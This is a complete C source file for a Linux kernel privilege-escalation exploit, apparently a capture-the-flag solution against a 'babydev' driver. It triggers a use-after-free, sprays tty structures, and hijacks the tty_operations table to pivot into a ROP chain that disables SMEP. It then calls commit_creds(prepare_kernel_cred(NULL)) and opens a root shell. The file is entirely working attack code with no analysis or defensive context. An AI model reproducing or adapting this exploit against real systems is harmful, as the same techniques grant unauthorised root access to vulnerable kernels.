/**
 * Compile with: gcc exploit.c -o exploit -O0 -std=c99 -Wall --static
 */

#define _GNU_SOURCE
#include <asm/types.h>
#include <mqueue.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <linux/netlink.h>
#include <pthread.h>
#include <errno.h>
#include <stdbool.h>
#include <sched.h>
#include <stddef.h>
#include <sys/mman.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

/*****************************************************************************
 ** FUNCTION HEADERS
 *****************************************************************************/
int migrate_to_cpu0(void);
int init(int *fd, int *fd2);
int set_buf_size(int fd, size_t sz);
int triger_uaf(int fd, int fd2);
int escalate(int fd);
int alloc_fake_structures(void);
void build_rop_chain(uint64_t *stack);
extern void userland_entry(void); /* make gcc happy */
typedef int (*commit_creds_func)(void *new);
typedef void *(*prepare_kernel_creds_func)(void *daemon);

/*****************************************************************************
 ** OTHER CONSTANTS
 *****************************************************************************/
#define HEAP_SPRAY_POWER 100
#define PAGE_SIZE 4096
#define SMEP_MASK (~((uint64_t)(1 << 20)))
#define PANIC_ADDR ((void *)0xffffffff81553684)

#define _getpid() syscall(__NR_getpid)
#define _sched_setaffinity(pid, cpusetsize, mask) \
    syscall(__NR_sched_setaffinity, pid, cpusetsize, mask)
#define _mmap(addr, length, prot, flags, fd, offset) \
    syscall(__NR_mmap, addr, length, prot, flags, fd, offset)

/*****************************************************************************
 ** TARGET_SPECIFIC_CONSTANTS\MACROS
 *****************************************************************************/
#define SET_BUF_SIZE_CMD 0x10001
#define REALLOCATION_SIZE 0x2e0

#define TTY_OPERATIONS_SIZE 0xf0
#define IOCTL_STRUCT_TTY_OPERATIONS_OFST 0x18
#define MAGIC_STRUCT_TTY_OPERATIONS_OFST 0x0
#define TTY_MAGIC 0x5401
#define TTY_HDR_SIZE 0x20

#define RSP_RBP_OFST 0xb0

#define MOV_ESP_ECX ((uint64_t)0xffffffff8101dd39)
#define MOV_CR4_RDI ((uint64_t)0xffffffff81004d80)
#define MOV_RAX_CR4 ((uint64_t)0xffffffff81004c14)
#define POP_RSI ((uint64_t)0xffffffff812c6c4e)
#define AND_RAX_RSI ((uint64_t)0xffffffff815df7f6)
#define MOV_RDI_RAX ((uint64_t)0xffffffff8133b32e)
#define JMP_RCX ((uint64_t)0xffffffff81047fb0)
#define POP_RCX ((uint64_t)0xffffffff8100700c)
#define MOV_DWORDPTR_RCX_EAX ((uint64_t)0xffffffff81004d05)
#define XCHG_RBP_RAX ((uint64_t)0xffffffff81446980)
#define SHR_RAX_32 ((uint64_t)0xffffffff81216ede)

#define STORE_EAX(addr)        \
    *stack++ = POP_RCX;        \
    *stack++ = (uint64_t)addr; \
    *stack++ = MOV_DWORDPTR_RCX_EAX;

#define SAVE_RBP(addr_hi, addr_lo) \
    *stack++ = XCHG_RBP_RAX;       \
    STORE_EAX(addr_lo);            \
    *stack++ = SHR_RAX_32;         \
    STORE_EAX(addr_hi);

#define DISABLE_SMEP()             \
    *stack++ = MOV_RAX_CR4;        \
    *stack++ = 0x4141414141414141; \
    *stack++ = POP_RSI;            \
    *stack++ = SMEP_MASK;          \
    *stack++ = AND_RAX_RSI;        \
    *stack++ = 0x4141414141414141; \
    *stack++ = MOV_RDI_RAX;        \
    *stack++ = 0x4141414141414141; \
    *stack++ = 0x4141414141414141; \
    *stack++ = MOV_CR4_RDI;        \
    *stack++ = 0x4141414141414141;

#define JMP_TO(addr)           \
    *stack++ = POP_RCX;        \
    *stack++ = (uint64_t)addr; \
    *stack++ = JMP_RCX;

#define COMMIT_CREDS ((void *)0xffffffff810a1420)
#define PREPARE_KERNEL_CRED ((void *)0xffffffff810a1810)

#define commit_creds(cred) \
    (((commit_creds_func)(COMMIT_CREDS))(cred))

#define prepare_kernel_cred(daemon) \
    (((prepare_kernel_creds_func)(PREPARE_KERNEL_CRED))(daemon))

/*****************************************************************************
 ** GLOBALS
 *****************************************************************************/
int g_tty_fds[HEAP_SPRAY_POWER];
char *g_fake_stack;
char *g_fake_tty_operations;
uint64_t g_saved_rbp_hi;
uint64_t g_saved_rbp_lo;
uint64_t g_restored_rbp;
uint64_t g_restored_rsp;

static void payload(void)
{
    commit_creds(prepare_kernel_cred(NULL));
}

static __attribute__((unused)) void wrapper(void)
{
    /* avoid prolog */
    __asm__ volatile("userland_entry:" ::);

    /* restore saved rbp & rsp */
    g_restored_rbp = ((g_saved_rbp_hi << 32) | g_saved_rbp_lo);
    g_restored_rsp = ((g_saved_rbp_hi << 32) | (g_saved_rbp_lo - RSP_RBP_OFST));

    __asm__ volatile("movq %0, %%rax\n"
                     "movq %%rax, %%rbp\n" ::"m"(g_restored_rbp));

    __asm__ volatile("movq %0, %%rax\n"
                     "movq %%rax, %%rsp\n" ::"m"(g_restored_rsp));

    /* escalate current process via commit_creds */
    uint64_t ptr = (uint64_t)&payload;
    __asm__ volatile("movq %0, %%rax\n"
                     "call *%%rax\n" ::"m"(ptr));

    /* make ioctl return some value */
    __asm__ volatile("movq $5555, %%rax\n" ::);

    /* avoid epilogue especially `leave` instruction */
    __asm__ volatile("ret" ::);
}

int migrate_to_cpu0(void)
{
    int err;
    cpu_set_t set;

    CPU_ZERO(&set);
    CPU_SET(0, &set);

    err = _sched_setaffinity(_getpid(), sizeof(set), &set);
    if (err == -1)
    {
        perror("[-] Failed to migrate to cpu0");
        goto fail;
    }

    return 0;
fail:
    return -1;
}

int set_buf_size(int fd, size_t sz)
{
    int err;

    err = ioctl(fd, SET_BUF_SIZE_CMD, sz);
    if (err < 0)
    {
        perror("[-] Failed to set buf size");
        goto fail;
    }

    return 0;
fail:
    return -1;
}

/**
 * Allocate fake tty_operations struct and fake stack. Use mmap syscall to 
 * allocate:
 * - g_fake_stack at low memory region
 * - g_fake_tty_operations above 0xffffffff address
 * Moreover g_fake_stack must be equal to g_fake_tty_operations & 0xffffffff.
 * We will use above property later when performing stack pivot. We will use:
 * `mov esp, ecx ; ret` 
 * gadget, where rcx holds address of g_fake_tty_operations. This way we will
 * make esp point to g_fake_stack.
 */
int alloc_fake_structures(void)
{
    /* Arbitrary value, must not collide with already mapped memory (/proc/<PID>/maps) */
    void *starting_addr = (void *)0x100000000 + 0x20000000;
    size_t max_try = 10;

retry:
    g_fake_tty_operations = (char *)_mmap(starting_addr, TTY_OPERATIONS_SIZE, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS | MAP_LOCKED | MAP_POPULATE, -1, 0);
    if (g_fake_tty_operations == MAP_FAILED)
        goto retry;

    g_fake_stack = (char *)_mmap((uint64_t)g_fake_tty_operations & 0xffffffff, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS | MAP_LOCKED | MAP_POPULATE, -1, 0);
    if (g_fake_stack == MAP_FAILED)
    {
        munmap((void *)g_fake_tty_operations, TTY_OPERATIONS_SIZE);
        goto retry;
    }

    /* Paranoid check :) */
    if ((uint64_t)g_fake_stack != ((uint64_t)g_fake_tty_operations & 0xffffffff))
    {
        munmap((void *)g_fake_tty_operations, TTY_OPERATIONS_SIZE);
        munmap((void *)g_fake_stack, PAGE_SIZE);
        goto retry;
    }

    if (max_try == 0)
    {
        fprintf(stderr, "[-] Failed to allocate fake structures\n");
        return -1;
    }
    max_try--;
    starting_addr += PAGE_SIZE;

    printf("[i] g_fake_tty_operations: %p\n", g_fake_tty_operations);
    printf("[i] g_fake_stack: %p\n", g_fake_stack);

    memset(g_fake_tty_operations, 0x41, TTY_OPERATIONS_SIZE);
    /* Set fake_tty_operations->ioctl=stack_pivot gadget. */
    *((uint64_t *)g_fake_tty_operations + 12) = MOV_ESP_ECX;

    build_rop_chain((uint64_t *)g_fake_stack);

    return 0;
}

/**
 * Open and resize the device_buffer twice.
 */
int init(int *fd, int *fd2)
{
    if (migrate_to_cpu0() < 0)
        goto fail;

    if (alloc_fake_structures() < 0)
        goto fail;

    *fd = open("/dev/babydev", O_RDWR, 0);
    if (*fd < 0)
    {
        perror("[-] Failed to open /dev/babydev");
        goto fail;
    }

    *fd2 = open("/dev/babydev", O_RDWR, 0);
    if (*fd2 < 0)
    {
        perror("[-] Failed to open /dev/babydev");
        goto fail;
    }

    if (set_buf_size(*fd, REALLOCATION_SIZE) < 0)
        goto fail;
    if (set_buf_size(*fd2, REALLOCATION_SIZE) < 0)
        goto fail;

    return 0;
fail:
    return -1;
}

/**
 * Free fd2 and allocate reallocation gadgets to create use-after-free.
 */
int triger_uaf(int fd, int fd2)
{
    int magic;

    /* Free slub object. Note that we still control it from fd. */
    close(fd2);

    /* Heap spray. */
    for (int i = 0; i < HEAP_SPRAY_POWER; ++i)
    {
        g_tty_fds[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY, 0);
        if (g_tty_fds[i] < 0)
        {
            perror("Failed to open /dev/ptmx");
            goto fail;
        }
    }

    /* Check if we successfully gained use-after-free. */
    if (read(fd, &magic, sizeof(magic)) != sizeof(magic))
    {
        perror("read failed:");
        goto fail;
    }

    if (magic != TTY_MAGIC)
    {
        fprintf(stderr, "[-] Magic number mismatch, expected: %x, got: %x", TTY_MAGIC, magic);
        goto fail;
    }

    return 0;
fail:
    return -1;
}

void build_rop_chain(uint64_t *stack)
{
    memset(stack, 0x0, PAGE_SIZE);

    SAVE_RBP(&g_saved_rbp_hi, &g_saved_rbp_lo);
    DISABLE_SMEP();
    JMP_TO(&userland_entry);
}

int escalate(int fd)
{
    char fake_tty_header[TTY_HDR_SIZE];

    /* Overwrite tty_operations field of struct tty pointer to point to fake_tty_operations vtable. */
    if (read(fd, fake_tty_header, sizeof(fake_tty_header)) != sizeof(fake_tty_header))
    {
        perror("read struct tty header failed");
        goto fail;
    }
    *((uint64_t *)fake_tty_header + 3) = (uint64_t)g_fake_tty_operations;

    if (write(fd, fake_tty_header, sizeof(fake_tty_header)) != sizeof(fake_tty_header))
    {
        perror("[-] Failed to overwrite struct tty\n");
        goto fail;
    }

    /* Triger stack pivot. */
    for (int i = 0; i < HEAP_SPRAY_POWER; ++i)
        ioctl(g_tty_fds[i], 0, 0);

    return 0;
fail:
    return -1;
}

int main()
{
    int fd, fd2;

    if (init(&fd, &fd2) < 0)
    {
        fprintf(stderr, "[-] Failed to initialize data.\n");
        goto fail;
    }
    printf("[+] Initialization succeed.\n");

    if (triger_uaf(fd, fd2) < 0)
    {
        fprintf(stderr, "[-] Failed to triger use-after-free vulnerability.\n");
        goto fail;
    }
    printf("[+] Triggered use-after-free.\n");

    if (escalate(fd) < 0) {
        fprintf(stderr, "[-] Failed to escalate\n");
        goto fail;
    }
    printf("[+] Escalation phase succeed.\n");

    printf("[i] Poping shell...");
    system("/bin/sh");

    return 0;

fail:
    return -1;
}